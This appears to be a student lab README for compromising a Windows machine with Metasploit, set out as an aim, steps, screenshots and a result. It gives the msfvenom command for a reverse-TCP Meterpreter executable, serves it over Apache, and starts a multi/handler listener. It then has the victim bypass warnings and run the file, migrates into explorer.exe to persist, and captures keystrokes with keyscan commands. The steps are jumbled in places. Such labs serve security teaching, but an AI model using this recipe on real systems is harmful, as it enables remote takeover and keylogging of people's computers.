# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands
# PROGRAM:
Find the attackers ip address using ifconfig

# OUTPUT:
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/sachinezhilmaran/Compromising-windows-using-Metasploit/assets/128135351/b9eb08be-ee84-48f6-9b95-f75a5ef4c10a)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/sachinezhilmaran/Compromising-windows-using-Metasploit/assets/128135351/32f0f4c0-bd07-48f6-b56b-c6d93b4ed080)

Start apache server sudo systemctl apache2 start and Check the status of apache2

![image](https://github.com/sachinezhilmaran/Compromising-windows-using-Metasploit/assets/128135351/a258bd8b-ecc2-4e66-a4ba-3b9e68d89f21)
# Invoke msfconsole:

# OUTPUT:
![image](https://github.com/sachinezhilmaran/Compromising-windows-using-Metasploit/assets/128135351/be166b27-1e3d-4627-b73e-390ecff8d1fa)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/sachinezhilmaran/Compromising-windows-using-Metasploit/assets/128135351/e2dfae3b-5418-4315-a71b-14d78539e5fa)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/sachinezhilmaran/Compromising-windows-using-Metasploit/assets/128135351/3c5900dc-2258-4e7f-a1bd-d977f429ae8d)
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/sachinezhilmaran/Compromising-windows-using-Metasploit/assets/128135351/8f30eba6-d8de-497e-a41b-99849624294c)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/sachinezhilmaran/Compromising-windows-using-Metasploit/assets/128135351/4a21515f-43e0-4c6e-83c6-fa4c3b92446b)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/sachinezhilmaran/Compromising-windows-using-Metasploit/assets/128135351/2bb2a213-9dd6-4b39-b475-ba50b17a0e4e)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
